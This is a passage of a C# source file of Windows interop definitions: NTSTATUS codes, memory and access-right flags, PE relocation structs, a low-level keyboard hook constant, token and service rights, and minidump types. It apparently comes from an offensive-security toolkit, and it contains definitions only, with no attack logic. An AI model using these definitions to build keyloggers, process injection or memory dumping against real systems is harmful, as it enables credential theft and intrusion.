                FileLockedWithWriters = 0x0000012b,

                // Informational
                Informational = 0x40000000,
                ObjectNameExists = 0x40000000,
                ThreadWasSuspended = 0x40000001,
                WorkingSetLimitRange = 0x40000002,
                ImageNotAtBase = 0x40000003,
                RegistryRecovered = 0x40000009,

                // Warning
                Warning = 0x80000000,
                GuardPageViolation = 0x80000001,
                DatatypeMisalignment = 0x80000002,
                Breakpoint = 0x80000003,
                SingleStep = 0x80000004,
                BufferOverflow = 0x80000005,
                NoMoreFiles = 0x80000006,
                HandlesClosed = 0x8000000a,
                PartialCopy = 0x8000000d,
                DeviceBusy = 0x80000011,
                InvalidEaName = 0x80000013,
                EaListInconsistent = 0x80000014,
                NoMoreEntries = 0x8000001a,
                LongJump = 0x80000026,
                DllMightBeInsecure = 0x8000002b,

                // Error
                Error = 0xc0000000,
                Unsuccessful = 0xc0000001,
                NotImplemented = 0xc0000002,
                InvalidInfoClass = 0xc0000003,
                InfoLengthMismatch = 0xc0000004,
                AccessViolation = 0xc0000005,
                InPageError = 0xc0000006,
                PagefileQuota = 0xc0000007,
                InvalidHandle = 0xc0000008,
                BadInitialStack = 0xc0000009,
                BadInitialPc = 0xc000000a,
                InvalidCid = 0xc000000b,
                TimerNotCanceled = 0xc000000c,
                InvalidParameter = 0xc000000d,
                NoSuchDevice = 0xc000000e,
                NoSuchFile = 0xc000000f,
                InvalidDeviceRequest = 0xc0000010,
                EndOfFile = 0xc0000011,
                WrongVolume = 0xc0000012,
                NoMediaInDevice = 0xc0000013,
                NoMemory = 0xc0000017,
                ConflictingAddresses = 0xc0000018,
                NotMappedView = 0xc0000019,
                UnableToFreeVm = 0xc000001a,
                UnableToDeleteSection = 0xc000001b,
                IllegalInstruction = 0xc000001d,
                AlreadyCommitted = 0xc0000021,
                AccessDenied = 0xc0000022,
                BufferTooSmall = 0xc0000023,
                ObjectTypeMismatch = 0xc0000024,
                NonContinuableException = 0xc0000025,
                BadStack = 0xc0000028,
                NotLocked = 0xc000002a,
                NotCommitted = 0xc000002d,
                InvalidParameterMix = 0xc0000030,
                ObjectNameInvalid = 0xc0000033,
                ObjectNameNotFound = 0xc0000034,
                ObjectNameCollision = 0xc0000035,
                ObjectPathInvalid = 0xc0000039,
                ObjectPathNotFound = 0xc000003a,
                ObjectPathSyntaxBad = 0xc000003b,
                DataOverrun = 0xc000003c,
                DataLate = 0xc000003d,
                DataError = 0xc000003e,
                CrcError = 0xc000003f,
                SectionTooBig = 0xc0000040,
                PortConnectionRefused = 0xc0000041,
                InvalidPortHandle = 0xc0000042,
                SharingViolation = 0xc0000043,
                QuotaExceeded = 0xc0000044,
                InvalidPageProtection = 0xc0000045,
                MutantNotOwned = 0xc0000046,
                SemaphoreLimitExceeded = 0xc0000047,
                PortAlreadySet = 0xc0000048,
                SectionNotImage = 0xc0000049,
                SuspendCountExceeded = 0xc000004a,
                ThreadIsTerminating = 0xc000004b,
                BadWorkingSetLimit = 0xc000004c,
                IncompatibleFileMap = 0xc000004d,
                SectionProtection = 0xc000004e,
                EasNotSupported = 0xc000004f,
                EaTooLarge = 0xc0000050,
                NonExistentEaEntry = 0xc0000051,
                NoEasOnFile = 0xc0000052,
                EaCorruptError = 0xc0000053,
                FileLockConflict = 0xc0000054,
                LockNotGranted = 0xc0000055,
                DeletePending = 0xc0000056,
                CtlFileNotSupported = 0xc0000057,
                UnknownRevision = 0xc0000058,
                RevisionMismatch = 0xc0000059,
                InvalidOwner = 0xc000005a,
                InvalidPrimaryGroup = 0xc000005b,
                NoImpersonationToken = 0xc000005c,
                CantDisableMandatory = 0xc000005d,
                NoLogonServers = 0xc000005e,
                NoSuchLogonSession = 0xc000005f,
                NoSuchPrivilege = 0xc0000060,
                PrivilegeNotHeld = 0xc0000061,
                InvalidAccountName = 0xc0000062,
                UserExists = 0xc0000063,
                NoSuchUser = 0xc0000064,
                GroupExists = 0xc0000065,
                NoSuchGroup = 0xc0000066,
                MemberInGroup = 0xc0000067,
                MemberNotInGroup = 0xc0000068,
                LastAdmin = 0xc0000069,
                WrongPassword = 0xc000006a,
                IllFormedPassword = 0xc000006b,
                PasswordRestriction = 0xc000006c,
                LogonFailure = 0xc000006d,
                AccountRestriction = 0xc000006e,
                InvalidLogonHours = 0xc000006f,
                InvalidWorkstation = 0xc0000070,
                PasswordExpired = 0xc0000071,
                AccountDisabled = 0xc0000072,
                NoneMapped = 0xc0000073,
                TooManyLuidsRequested = 0xc0000074,
                LuidsExhausted = 0xc0000075,
                InvalidSubAuthority = 0xc0000076,
                InvalidAcl = 0xc0000077,
                InvalidSid = 0xc0000078,
                InvalidSecurityDescr = 0xc0000079,
                ProcedureNotFound = 0xc000007a,
                InvalidImageFormat = 0xc000007b,
                NoToken = 0xc000007c,
                BadInheritanceAcl = 0xc000007d,
                RangeNotLocked = 0xc000007e,
                DiskFull = 0xc000007f,
                ServerDisabled = 0xc0000080,
                ServerNotDisabled = 0xc0000081,
                TooManyGuidsRequested = 0xc0000082,
                GuidsExhausted = 0xc0000083,
                InvalidIdAuthority = 0xc0000084,
                AgentsExhausted = 0xc0000085,
                InvalidVolumeLabel = 0xc0000086,
                SectionNotExtended = 0xc0000087,
                NotMappedData = 0xc0000088,
                ResourceDataNotFound = 0xc0000089,
                ResourceTypeNotFound = 0xc000008a,
                ResourceNameNotFound = 0xc000008b,
                ArrayBoundsExceeded = 0xc000008c,
                FloatDenormalOperand = 0xc000008d,
                FloatDivideByZero = 0xc000008e,
                FloatInexactResult = 0xc000008f,
                FloatInvalidOperation = 0xc0000090,
                FloatOverflow = 0xc0000091,
                FloatStackCheck = 0xc0000092,
                FloatUnderflow = 0xc0000093,
                IntegerDivideByZero = 0xc0000094,
                IntegerOverflow = 0xc0000095,
                PrivilegedInstruction = 0xc0000096,
                TooManyPagingFiles = 0xc0000097,
                FileInvalid = 0xc0000098,
                InsufficientResources = 0xc000009a,
                InstanceNotAvailable = 0xc00000ab,
                PipeNotAvailable = 0xc00000ac,
                InvalidPipeState = 0xc00000ad,
                PipeBusy = 0xc00000ae,
                IllegalFunction = 0xc00000af,
                PipeDisconnected = 0xc00000b0,
                PipeClosing = 0xc00000b1,
                PipeConnected = 0xc00000b2,
                PipeListening = 0xc00000b3,
                InvalidReadMode = 0xc00000b4,
                IoTimeout = 0xc00000b5,
                FileForcedClosed = 0xc00000b6,
                ProfilingNotStarted = 0xc00000b7,
                ProfilingNotStopped = 0xc00000b8,
                NotSameDevice = 0xc00000d4,
                FileRenamed = 0xc00000d5,
                CantWait = 0xc00000d8,
                PipeEmpty = 0xc00000d9,
                CantTerminateSelf = 0xc00000db,
                InternalError = 0xc00000e5,
                InvalidParameter1 = 0xc00000ef,
                InvalidParameter2 = 0xc00000f0,
                InvalidParameter3 = 0xc00000f1,
                InvalidParameter4 = 0xc00000f2,
                InvalidParameter5 = 0xc00000f3,
                InvalidParameter6 = 0xc00000f4,
                InvalidParameter7 = 0xc00000f5,
                InvalidParameter8 = 0xc00000f6,
                InvalidParameter9 = 0xc00000f7,
                InvalidParameter10 = 0xc00000f8,
                InvalidParameter11 = 0xc00000f9,
                InvalidParameter12 = 0xc00000fa,
                ProcessIsTerminating = 0xc000010a,
                MappedFileSizeZero = 0xc000011e,
                TooManyOpenedFiles = 0xc000011f,
                Cancelled = 0xc0000120,
                CannotDelete = 0xc0000121,
                InvalidComputerName = 0xc0000122,
                FileDeleted = 0xc0000123,
                SpecialAccount = 0xc0000124,
                SpecialGroup = 0xc0000125,
                SpecialUser = 0xc0000126,
                MembersPrimaryGroup = 0xc0000127,
                FileClosed = 0xc0000128,
                TooManyThreads = 0xc0000129,
                ThreadNotInProcess = 0xc000012a,
                TokenAlreadyInUse = 0xc000012b,
                PagefileQuotaExceeded = 0xc000012c,
                CommitmentLimit = 0xc000012d,
                InvalidImageLeFormat = 0xc000012e,
                InvalidImageNotMz = 0xc000012f,
                InvalidImageProtect = 0xc0000130,
                InvalidImageWin16 = 0xc0000131,
                LogonServer = 0xc0000132,
                DifferenceAtDc = 0xc0000133,
                SynchronizationRequired = 0xc0000134,
                DllNotFound = 0xc0000135,
                IoPrivilegeFailed = 0xc0000137,
                OrdinalNotFound = 0xc0000138,
                EntryPointNotFound = 0xc0000139,
                ControlCExit = 0xc000013a,
                InvalidAddress = 0xc0000141,
                PortNotSet = 0xc0000353,
                DebuggerInactive = 0xc0000354,
                CallbackBypass = 0xc0000503,
                PortClosed = 0xc0000700,
                MessageLost = 0xc0000701,
                InvalidMessage = 0xc0000702,
                RequestCanceled = 0xc0000703,
                RecursiveDispatch = 0xc0000704,
                LpcReceiveBufferExpected = 0xc0000705,
                LpcInvalidConnectionUsage = 0xc0000706,
                LpcRequestsNotAllowed = 0xc0000707,
                ResourceInUse = 0xc0000708,
                ProcessIsProtected = 0xc0000712,
                VolumeDirty = 0xc0000806,
                FileCheckedOut = 0xc0000901,
                CheckOutRequired = 0xc0000902,
                BadFileType = 0xc0000903,
                FileTooLarge = 0xc0000904,
                FormsAuthRequired = 0xc0000905,
                VirusInfected = 0xc0000906,
                VirusDeleted = 0xc0000907,
                TransactionalConflict = 0xc0190001,
                InvalidTransaction = 0xc0190002,
                TransactionNotActive = 0xc0190003,
                TmInitializationFailed = 0xc0190004,
                RmNotActive = 0xc0190005,
                RmMetadataCorrupt = 0xc0190006,
                TransactionNotJoined = 0xc0190007,
                DirectoryNotRm = 0xc0190008,
                CouldNotResizeLog = 0xc0190009,
                TransactionsUnsupportedRemote = 0xc019000a,
                LogResizeInvalidSize = 0xc019000b,
                RemoteFileVersionMismatch = 0xc019000c,
                CrmProtocolAlreadyExists = 0xc019000f,
                TransactionPropagationFailed = 0xc0190010,
                CrmProtocolNotFound = 0xc0190011,
                TransactionSuperiorExists = 0xc0190012,
                TransactionRequestNotValid = 0xc0190013,
                TransactionNotRequested = 0xc0190014,
                TransactionAlreadyAborted = 0xc0190015,
                TransactionAlreadyCommitted = 0xc0190016,
                TransactionInvalidMarshallBuffer = 0xc0190017,
                CurrentTransactionNotValid = 0xc0190018,
                LogGrowthFailed = 0xc0190019,
                ObjectNoLongerExists = 0xc0190021,
                StreamMiniversionNotFound = 0xc0190022,
                StreamMiniversionNotValid = 0xc0190023,
                MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
                CantOpenMiniversionWithModifyIntent = 0xc0190025,
                CantCreateMoreStreamMiniversions = 0xc0190026,
                HandleNoLongerValid = 0xc0190028,
                NoTxfMetadata = 0xc0190029,
                LogCorruptionDetected = 0xc0190030,
                CantRecoverWithHandleOpen = 0xc0190031,
                RmDisconnected = 0xc0190032,
                EnlistmentNotSuperior = 0xc0190033,
                RecoveryNotNeeded = 0xc0190034,
                RmAlreadyStarted = 0xc0190035,
                FileIdentityNotPersistent = 0xc0190036,
                CantBreakTransactionalDependency = 0xc0190037,
                CantCrossRmBoundary = 0xc0190038,
                TxfDirNotEmpty = 0xc0190039,
                IndoubtTransactionsExist = 0xc019003a,
                TmVolatile = 0xc019003b,
                RollbackTimerExpired = 0xc019003c,
                TxfAttributeCorrupt = 0xc019003d,
                EfsNotAllowedInTransaction = 0xc019003e,
                TransactionalOpenNotAllowed = 0xc019003f,
                TransactedMappingUnsupportedRemote = 0xc0190040,
                TxfMetadataAlreadyPresent = 0xc0190041,
                TransactionScopeCallbacksNotSet = 0xc0190042,
                TransactionRequiredPromotion = 0xc0190043,
                CannotExecuteFileInTransaction = 0xc0190044,
                TransactionsNotFrozen = 0xc0190045,

                MaximumNtStatus = 0xffffffff
            }
        }

        public static class Win32
        {
            public static class Kernel32
            {
                public static uint MEM_COMMIT = 0x1000;
                public static uint MEM_RESERVE = 0x2000;
                public static uint MEM_RESET = 0x80000;
                public static uint MEM_RESET_UNDO = 0x1000000;
                public static uint MEM_LARGE_PAGES = 0x20000000;
                public static uint MEM_PHYSICAL = 0x400000;
                public static uint MEM_TOP_DOWN = 0x100000;
                public static uint MEM_WRITE_WATCH = 0x200000;
                public static uint MEM_COALESCE_PLACEHOLDERS = 0x1;
                public static uint MEM_PRESERVE_PLACEHOLDER = 0x2;
                public static uint MEM_DECOMMIT = 0x4000;
                public static uint MEM_RELEASE = 0x8000;

                [StructLayout(LayoutKind.Sequential)]
                public struct IMAGE_BASE_RELOCATION
                {
                    public uint VirtualAdress;
                    public uint SizeOfBlock;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct IMAGE_IMPORT_DESCRIPTOR
                {
                    public uint OriginalFirstThunk;
                    public uint TimeDateStamp;
                    public uint ForwarderChain;
                    public uint Name;
                    public uint FirstThunk;
                }

                public struct SYSTEM_INFO
                {
                    public ushort wProcessorArchitecture;
                    public ushort wReserved;
                    public uint dwPageSize;
                    public IntPtr lpMinimumApplicationAddress;
                    public IntPtr lpMaximumApplicationAddress;
                    public UIntPtr dwActiveProcessorMask;
                    public uint dwNumberOfProcessors;
                    public uint dwProcessorType;
                    public uint dwAllocationGranularity;
                    public ushort wProcessorLevel;
                    public ushort wProcessorRevision;
                };

                public enum Platform
                {
                    x86,
                    x64,
                    IA64,
                    Unknown
                }

                [Flags]
                public enum ProcessAccessFlags : UInt32
                {
                    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396
                    PROCESS_ALL_ACCESS = 0x001F0FFF,
                    PROCESS_CREATE_PROCESS = 0x0080,
                    PROCESS_CREATE_THREAD = 0x0002,
                    PROCESS_DUP_HANDLE = 0x0040,
                    PROCESS_QUERY_INFORMATION = 0x0400,
                    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
                    PROCESS_SET_INFORMATION = 0x0200,
                    PROCESS_SET_QUOTA = 0x0100,
                    PROCESS_SUSPEND_RESUME = 0x0800,
                    PROCESS_TERMINATE = 0x0001,
                    PROCESS_VM_OPERATION = 0x0008,
                    PROCESS_VM_READ = 0x0010,
                    PROCESS_VM_WRITE = 0x0020,
                    SYNCHRONIZE = 0x00100000
                }

                [Flags]
                public enum FileAccessFlags : UInt32
                {
                    DELETE = 0x10000,
                    FILE_READ_DATA = 0x1,
                    FILE_READ_ATTRIBUTES = 0x80,
                    FILE_READ_EA = 0x8,
                    READ_CONTROL = 0x20000,
                    FILE_WRITE_DATA = 0x2,
                    FILE_WRITE_ATTRIBUTES = 0x100,
                    FILE_WRITE_EA = 0x10,
                    FILE_APPEND_DATA = 0x4,
                    WRITE_DAC = 0x40000,
                    WRITE_OWNER = 0x80000,
                    SYNCHRONIZE = 0x100000,
                    FILE_EXECUTE = 0x20
                }

                [Flags]
                public enum FileShareFlags : UInt32
                {
                    FILE_SHARE_NONE = 0x0,
                    FILE_SHARE_READ = 0x1,
                    FILE_SHARE_WRITE = 0x2,
                    FILE_SHARE_DELETE = 0x4
                }

                [Flags]
                public enum FileOpenFlags : UInt32
                {
                    FILE_DIRECTORY_FILE = 0x1,
                    FILE_WRITE_THROUGH = 0x2,
                    FILE_SEQUENTIAL_ONLY = 0x4,
                    FILE_NO_INTERMEDIATE_BUFFERING = 0x8,
                    FILE_SYNCHRONOUS_IO_ALERT = 0x10,
                    FILE_SYNCHRONOUS_IO_NONALERT = 0x20,
                    FILE_NON_DIRECTORY_FILE = 0x40,
                    FILE_CREATE_TREE_CONNECTION = 0x80,
                    FILE_COMPLETE_IF_OPLOCKED = 0x100,
                    FILE_NO_EA_KNOWLEDGE = 0x200,
                    FILE_OPEN_FOR_RECOVERY = 0x400,
                    FILE_RANDOM_ACCESS = 0x800,
                    FILE_DELETE_ON_CLOSE = 0x1000,
                    FILE_OPEN_BY_FILE_ID = 0x2000,
                    FILE_OPEN_FOR_BACKUP_INTENT = 0x4000,
                    FILE_NO_COMPRESSION = 0x8000
                }

                [Flags]
                public enum StandardRights : uint
                {
                    Delete = 0x00010000,
                    ReadControl = 0x00020000,
                    WriteDac = 0x00040000,
                    WriteOwner = 0x00080000,
                    Synchronize = 0x00100000,
                    Required = 0x000f0000,
                    Read = ReadControl,
                    Write = ReadControl,
                    Execute = ReadControl,
                    All = 0x001f0000,

                    SpecificRightsAll = 0x0000ffff,
                    AccessSystemSecurity = 0x01000000,
                    MaximumAllowed = 0x02000000,
                    GenericRead = 0x80000000,
                    GenericWrite = 0x40000000,
                    GenericExecute = 0x20000000,
                    GenericAll = 0x10000000
                }

                [Flags]
                public enum ThreadAccess : uint
                {
                    Terminate = 0x0001,
                    SuspendResume = 0x0002,
                    Alert = 0x0004,
                    GetContext = 0x0008,
                    SetContext = 0x0010,
                    SetInformation = 0x0020,
                    QueryInformation = 0x0040,
                    SetThreadToken = 0x0080,
                    Impersonate = 0x0100,
                    DirectImpersonation = 0x0200,
                    SetLimitedInformation = 0x0400,
                    QueryLimitedInformation = 0x0800,
                    All = StandardRights.Required | StandardRights.Synchronize | 0x3ff
                }
            }

            public static class User32
            {
                public static int WH_KEYBOARD_LL { get; } = 13;
                public static int WM_KEYDOWN { get; } = 0x0100;

                public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
            }

            public static class Netapi32
            {
                [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
                public struct LOCALGROUP_USERS_INFO_0
                {
                    [MarshalAs(UnmanagedType.LPWStr)] internal string name;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct LOCALGROUP_USERS_INFO_1
                {
                    [MarshalAs(UnmanagedType.LPWStr)] public string name;
                    [MarshalAs(UnmanagedType.LPWStr)] public string comment;
                }

                [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
                public struct LOCALGROUP_MEMBERS_INFO_2
                {
                    public IntPtr lgrmi2_sid;
                    public int lgrmi2_sidusage;
                    [MarshalAs(UnmanagedType.LPWStr)] public string lgrmi2_domainandname;
                }

                [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
                public struct WKSTA_USER_INFO_1
                {
                    public string wkui1_username;
                    public string wkui1_logon_domain;
                    public string wkui1_oth_domains;
                    public string wkui1_logon_server;
                }

                [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
                public struct SESSION_INFO_10
                {
                    public string sesi10_cname;
                    public string sesi10_username;
                    public int sesi10_time;
                    public int sesi10_idle_time;
                }

                public enum SID_NAME_USE : UInt16
                {
                    SidTypeUser = 1,
                    SidTypeGroup = 2,
                    SidTypeDomain = 3,
                    SidTypeAlias = 4,
                    SidTypeWellKnownGroup = 5,
                    SidTypeDeletedAccount = 6,
                    SidTypeInvalid = 7,
                    SidTypeUnknown = 8,
                    SidTypeComputer = 9
                }

                [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
                public struct SHARE_INFO_1
                {
                    public string shi1_netname;
                    public uint shi1_type;
                    public string shi1_remark;

                    public SHARE_INFO_1(string netname, uint type, string remark)
                    {
                        this.shi1_netname = netname;
                        this.shi1_type = type;
                        this.shi1_remark = remark;
                    }
                }
            }

            public static class Advapi32
            {

                // http://www.pinvoke.net/default.aspx/advapi32.openprocesstoken
                public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
                public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
                public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
                public const UInt32 TOKEN_DUPLICATE = 0x0002;
                public const UInt32 TOKEN_IMPERSONATE = 0x0004;
                public const UInt32 TOKEN_QUERY = 0x0008;
                public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
                public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
                public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
                public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
                public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
                public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
                public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                    TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                    TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                    TOKEN_ADJUST_SESSIONID);
                public const UInt32 TOKEN_ALT = (TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY);

                // https://msdn.microsoft.com/en-us/library/windows/desktop/ms682434(v=vs.85).aspx
                [Flags]
                public enum CREATION_FLAGS : uint
                {
                    NONE = 0x00000000,
                    DEBUG_PROCESS = 0x00000001,
                    DEBUG_ONLY_THIS_PROCESS = 0x00000002,
                    CREATE_SUSPENDED = 0x00000004,
                    DETACHED_PROCESS = 0x00000008,
                    CREATE_NEW_CONSOLE = 0x00000010,
                    NORMAL_PRIORITY_CLASS = 0x00000020,
                    IDLE_PRIORITY_CLASS = 0x00000040,
                    HIGH_PRIORITY_CLASS = 0x00000080,
                    REALTIME_PRIORITY_CLASS = 0x00000100,
                    CREATE_NEW_PROCESS_GROUP = 0x00000200,
                    CREATE_UNICODE_ENVIRONMENT = 0x00000400,
                    CREATE_SEPARATE_WOW_VDM = 0x00000800,
                    CREATE_SHARED_WOW_VDM = 0x00001000,
                    CREATE_FORCEDOS = 0x00002000,
                    BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
                    ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
                    INHERIT_PARENT_AFFINITY = 0x00010000,
                    INHERIT_CALLER_PRIORITY = 0x00020000,
                    CREATE_PROTECTED_PROCESS = 0x00040000,
                    EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
                    PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
                    PROCESS_MODE_BACKGROUND_END = 0x00200000,
                    CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
                    CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
                    CREATE_DEFAULT_ERROR_MODE = 0x04000000,
                    CREATE_NO_WINDOW = 0x08000000,
                    PROFILE_USER = 0x10000000,
                    PROFILE_KERNEL = 0x20000000,
                    PROFILE_SERVER = 0x40000000,
                    CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
                }

                [Flags]
                public enum LOGON_FLAGS
                {
                    NONE = 0x00000000,
                    LOGON_WITH_PROFILE = 0x00000001,
                    LOGON_NETCREDENTIALS_ONLY = 0x00000002
                }

                public enum LOGON_TYPE
                {
                    LOGON32_LOGON_INTERACTIVE = 2,
                    LOGON32_LOGON_NETWORK,
                    LOGON32_LOGON_BATCH,
                    LOGON32_LOGON_SERVICE,
                    LOGON32_LOGON_UNLOCK = 7,
                    LOGON32_LOGON_NETWORK_CLEARTEXT,
                    LOGON32_LOGON_NEW_CREDENTIALS
                }

                public enum LOGON_PROVIDER
                {
                    LOGON32_PROVIDER_DEFAULT,
                    LOGON32_PROVIDER_WINNT35,
                    LOGON32_PROVIDER_WINNT40,
                    LOGON32_PROVIDER_WINNT50
                }

                [Flags]
                public enum SCM_ACCESS : uint
                {
                    SC_MANAGER_CONNECT = 0x00001,
                    SC_MANAGER_CREATE_SERVICE = 0x00002,
                    SC_MANAGER_ENUMERATE_SERVICE = 0x00004,
                    SC_MANAGER_LOCK = 0x00008,
                    SC_MANAGER_QUERY_LOCK_STATUS = 0x00010,
                    SC_MANAGER_MODIFY_BOOT_CONFIG = 0x00020,

                    SC_MANAGER_ALL_ACCESS = ACCESS_MASK.STANDARD_RIGHTS_REQUIRED |
                        SC_MANAGER_CONNECT |
                        SC_MANAGER_CREATE_SERVICE |
                        SC_MANAGER_ENUMERATE_SERVICE |
                        SC_MANAGER_LOCK |
                        SC_MANAGER_QUERY_LOCK_STATUS |
                        SC_MANAGER_MODIFY_BOOT_CONFIG,

                    GENERIC_READ = ACCESS_MASK.STANDARD_RIGHTS_READ |
                        SC_MANAGER_ENUMERATE_SERVICE |
                        SC_MANAGER_QUERY_LOCK_STATUS,

                    GENERIC_WRITE = ACCESS_MASK.STANDARD_RIGHTS_WRITE |
                        SC_MANAGER_CREATE_SERVICE |
                        SC_MANAGER_MODIFY_BOOT_CONFIG,

                    GENERIC_EXECUTE = ACCESS_MASK.STANDARD_RIGHTS_EXECUTE |
                        SC_MANAGER_CONNECT | SC_MANAGER_LOCK,

                    GENERIC_ALL = SC_MANAGER_ALL_ACCESS,
                }

                [Flags]
                public enum ACCESS_MASK : uint
                {
                    DELETE = 0x00010000,
                    READ_CONTROL = 0x00020000,
                    WRITE_DAC = 0x00040000,
                    WRITE_OWNER = 0x00080000,
                    SYNCHRONIZE = 0x00100000,
                    STANDARD_RIGHTS_REQUIRED = 0x000F0000,
                    STANDARD_RIGHTS_READ = 0x00020000,
                    STANDARD_RIGHTS_WRITE = 0x00020000,
                    STANDARD_RIGHTS_EXECUTE = 0x00020000,
                    STANDARD_RIGHTS_ALL = 0x001F0000,
                    SPECIFIC_RIGHTS_ALL = 0x0000FFFF,
                    ACCESS_SYSTEM_SECURITY = 0x01000000,
                    MAXIMUM_ALLOWED = 0x02000000,
                    GENERIC_READ = 0x80000000,
                    GENERIC_WRITE = 0x40000000,
                    GENERIC_EXECUTE = 0x20000000,
                    GENERIC_ALL = 0x10000000,
                    DESKTOP_READOBJECTS = 0x00000001,
                    DESKTOP_CREATEWINDOW = 0x00000002,
                    DESKTOP_CREATEMENU = 0x00000004,
                    DESKTOP_HOOKCONTROL = 0x00000008,
                    DESKTOP_JOURNALRECORD = 0x00000010,
                    DESKTOP_JOURNALPLAYBACK = 0x00000020,
                    DESKTOP_ENUMERATE = 0x00000040,
                    DESKTOP_WRITEOBJECTS = 0x00000080,
                    DESKTOP_SWITCHDESKTOP = 0x00000100,
                    WINSTA_ENUMDESKTOPS = 0x00000001,
                    WINSTA_READATTRIBUTES = 0x00000002,
                    WINSTA_ACCESSCLIPBOARD = 0x00000004,
                    WINSTA_CREATEDESKTOP = 0x00000008,
                    WINSTA_WRITEATTRIBUTES = 0x00000010,
                    WINSTA_ACCESSGLOBALATOMS = 0x00000020,
                    WINSTA_EXITWINDOWS = 0x00000040,
                    WINSTA_ENUMERATE = 0x00000100,
                    WINSTA_READSCREEN = 0x00000200,
                    WINSTA_ALL_ACCESS = 0x0000037F
                }

                [Flags]
                public enum SERVICE_ACCESS : uint
                {
                    SERVICE_QUERY_CONFIG = 0x00001,
                    SERVICE_CHANGE_CONFIG = 0x00002,
                    SERVICE_QUERY_STATUS = 0x00004,
                    SERVICE_ENUMERATE_DEPENDENTS = 0x00008,
                    SERVICE_START = 0x00010,
                    SERVICE_STOP = 0x00020,
                    SERVICE_PAUSE_CONTINUE = 0x00040,
                    SERVICE_INTERROGATE = 0x00080,
                    SERVICE_USER_DEFINED_CONTROL = 0x00100,

                    SERVICE_ALL_ACCESS = (ACCESS_MASK.STANDARD_RIGHTS_REQUIRED |
                        SERVICE_QUERY_CONFIG |
                        SERVICE_CHANGE_CONFIG |
                        SERVICE_QUERY_STATUS |
                        SERVICE_ENUMERATE_DEPENDENTS |
                        SERVICE_START |
                        SERVICE_STOP |
                        SERVICE_PAUSE_CONTINUE |
                        SERVICE_INTERROGATE |
                        SERVICE_USER_DEFINED_CONTROL),

                    GENERIC_READ = ACCESS_MASK.STANDARD_RIGHTS_READ |
                        SERVICE_QUERY_CONFIG |
                        SERVICE_QUERY_STATUS |
                        SERVICE_INTERROGATE |
                        SERVICE_ENUMERATE_DEPENDENTS,

                    GENERIC_WRITE = ACCESS_MASK.STANDARD_RIGHTS_WRITE |
                        SERVICE_CHANGE_CONFIG,

                    GENERIC_EXECUTE = ACCESS_MASK.STANDARD_RIGHTS_EXECUTE |
                        SERVICE_START |
                        SERVICE_STOP |
                        SERVICE_PAUSE_CONTINUE |
                        SERVICE_USER_DEFINED_CONTROL,

                    ACCESS_SYSTEM_SECURITY = ACCESS_MASK.ACCESS_SYSTEM_SECURITY,
                    DELETE = ACCESS_MASK.DELETE,
                    READ_CONTROL = ACCESS_MASK.READ_CONTROL,
                    WRITE_DAC = ACCESS_MASK.WRITE_DAC,
                    WRITE_OWNER = ACCESS_MASK.WRITE_OWNER,
                }

                [Flags]
                public enum SERVICE_TYPE : uint
                {
                    SERVICE_KERNEL_DRIVER = 0x00000001,
                    SERVICE_FILE_SYSTEM_DRIVER = 0x00000002,
                    SERVICE_WIN32_OWN_PROCESS = 0x00000010,
                    SERVICE_WIN32_SHARE_PROCESS = 0x00000020,
                    SERVICE_INTERACTIVE_PROCESS = 0x00000100,
                }

                public enum SERVICE_START : uint
                {
                    SERVICE_BOOT_START = 0x00000000,
                    SERVICE_SYSTEM_START = 0x00000001,
                    SERVICE_AUTO_START = 0x00000002,
                    SERVICE_DEMAND_START = 0x00000003,
                    SERVICE_DISABLED = 0x00000004,
                }

                public enum SERVICE_ERROR
                {
                    SERVICE_ERROR_IGNORE = 0x00000000,
                    SERVICE_ERROR_NORMAL = 0x00000001,
                    SERVICE_ERROR_SEVERE = 0x00000002,
                    SERVICE_ERROR_CRITICAL = 0x00000003,
                }
            }

            public static class Dbghelp
            {
                public enum MINIDUMP_TYPE
                {
                    MiniDumpNormal = 0x00000000,
                    MiniDumpWithDataSegs = 0x00000001,
                    MiniDumpWithFullMemory = 0x00000002,
                    MiniDumpWithHandleData = 0x00000004,
                    MiniDumpFilterMemory = 0x00000008,
                    MiniDumpScanMemory = 0x00000010,
                    MiniDumpWithUnloadedModules = 0x00000020,
                    MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
                    MiniDumpFilterModulePaths = 0x00000080,
                    MiniDumpWithProcessThreadData = 0x00000100,
                    MiniDumpWithPrivateReadWriteMemory = 0x00000200,
                    MiniDumpWithoutOptionalData = 0x00000400,
                    MiniDumpWithFullMemoryInfo = 0x00000800,
